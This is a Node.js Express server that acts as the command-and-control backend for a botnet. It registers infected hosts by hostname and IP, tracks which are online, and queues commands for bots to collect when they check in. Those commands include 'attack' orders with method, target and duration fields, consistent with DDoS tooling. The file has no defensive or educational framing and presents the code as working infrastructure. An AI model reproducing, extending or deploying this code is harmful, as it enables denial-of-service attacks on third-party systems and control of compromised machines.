const express = require("express");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

// In-memory storage for bots and their commands
let bots = [];

// Middleware to clean up inactive bots
const cleanBots = () => {
    const now = Date.now();
    bots = bots.filter(bot => {
        // Remove bots that haven't checked in for 5 minutes (300000ms)
        return now - bot.lastSeen < 300000;
    });
};

// Bot registration endpoint
app.post("/api/bots", (req, res) => {
    const newBot = req.body;
    
    if (!newBot.hostname || !newBot.ip) {
        return res.status(400).json({ error: "Missing required bot information" });
    }

    // Update existing bot or add new one
    const existingBotIndex = bots.findIndex(b => b.hostname === newBot.hostname);
    
    if (existingBotIndex >= 0) {
        // Update existing bot
        bots[existingBotIndex] = { 
            ...bots[existingBotIndex], 
            ...newBot,
            lastSeen: Date.now()
        };
    } else {
        // Add new bot
        bots.push({
            ...newBot,
            lastSeen: Date.now(),
            registeredAt: Date.now()
        });
    }

    cleanBots();
    res.json({ 
        success: true,
        message: "Bot registered/updated successfully",
        totalBots: bots.length
    });
});

// Get all online bots
app.get("/api/bots", (req, res) => {
    cleanBots();
    res.json({
        success: true,
        count: bots.length,
        bots: bots.map(bot => ({
            hostname: bot.hostname,
            ip: bot.ip,
            os: bot.os,
            uptime: Math.floor((Date.now() - bot.lastSeen) / 1000),
            status: "online"
        }))
    });
});

// Send command to specific bot
app.post("/api/bots/command", (req, res) => {
    const { hostname, command } = req.body;
    
    if (!hostname || !command || !command.type) {
        return res.status(400).json({ error: "Missing required fields" });
    }

    cleanBots();
    const botIndex = bots.findIndex(b => b.hostname === hostname);
    
    if (botIndex === -1) {
        return res.status(404).json({ error: "Bot not found" });
    }

    // Validate attack commands
    if (command.type === "attack") {
        if (!command.method || !command.target || !command.duration) {
            return res.status(400).json({ error: "Missing attack parameters" });
        }
        
        // Basic input validation
        if (command.duration > 120) {
            return res.status(400).json({ error: "Duration too long (max 120 seconds)" });
        }
    }

    // Store the command for the bot to pick up
    bots[botIndex].command = command;
    bots[botIndex].lastCommandAt = Date.now();
    
    res.json({ 
        success: true,
        message: "Command queued for bot",
        command: command
    });
});

// Bot check-in endpoint to receive commands
app.get("/api/bots/:hostname/check", (req, res) => {
    const { hostname } = req.params;
    
    cleanBots();
    const botIndex = bots.findIndex(b => b.hostname === hostname);
    
    if (botIndex === -1) {
        return res.status(404).json({ error: "Bot not registered" });
    }

    // Update last seen time
    bots[botIndex].lastSeen = Date.now();
    
    // Check if there's a pending command
    const response = {
        success: true,
        hasCommand: false
    };

    if (bots[botIndex].command) {
        response.hasCommand = true;
        response.command = bots[botIndex].command;
        
        // Clear the command after sending it (one-time execution)
        delete bots[botIndex].command;
    }

    res.json(response);
});

module.exports = app; app 
